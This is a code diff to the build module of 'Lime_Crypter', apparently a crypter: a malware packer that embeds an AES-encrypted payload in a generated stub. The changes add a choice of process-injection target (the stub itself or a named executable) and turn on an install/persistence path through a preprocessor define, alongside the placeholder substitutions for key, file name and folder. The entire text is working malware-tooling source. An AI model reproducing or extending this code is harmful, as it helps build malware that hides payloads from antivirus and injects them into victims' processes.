@@ -56,6 +56,9 @@ namespace Lime_Crypter.Build
               {
             "System.dll",
             "System.Windows.Forms.dll",
+            "Microsoft.CSharp.dll",
+            "System.Dynamic.Runtime.dll",
+            "System.Core.dll",
               };
                 Dictionary<string, string> providerOptions = new Dictionary<string, string>() {
                 {"CompilerVersion", "v4.0" }
@@ -176,13 +179,18 @@ namespace Lime_Crypter.Build
 
             Stub = Stub.Replace("#ParentResource", StubResourcesName);
             Stub = Stub.Replace("#Payload", PayloadResources);
-            Stub = Stub.Replace("#Injection", InjectionName + ".exe");
+            if (InjectionName == "Itself")
+            {
+                InjectionName = "Application.ExecutablePath";
+                Stub = Stub.Replace("#Injection", InjectionName);
+            }
+            else
+                Stub = Stub.Replace("#Injection", "\"" + InjectionName + ".exe" + "\"");
             Stub = Stub.Replace("#AesKey", AesKey);
 
             if (IsInstall)
-                Stub = Stub.Replace("@IsInstall", "true");
-            else
-                Stub = Stub.Replace("@IsInstall", "false");
+                Stub = Stub.Replace("//#define install", "#define install");
+
             Stub = Stub.Replace("#FileName", FileName + ".exe");
             Stub = Stub.Replace("@FolderName", @"" + FolderName + @"");
             Stub = Stub.Replace("#SecondFolder", SecondFolder);
